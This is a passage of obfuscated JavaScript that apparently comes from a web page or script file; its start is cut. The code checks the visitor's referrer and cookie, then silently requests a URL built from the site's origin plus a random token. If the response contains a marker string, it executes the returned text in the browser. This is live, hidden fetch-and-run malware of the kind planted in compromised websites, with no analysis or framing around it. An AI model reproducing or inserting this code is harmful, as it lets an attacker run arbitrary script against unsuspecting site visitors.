XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};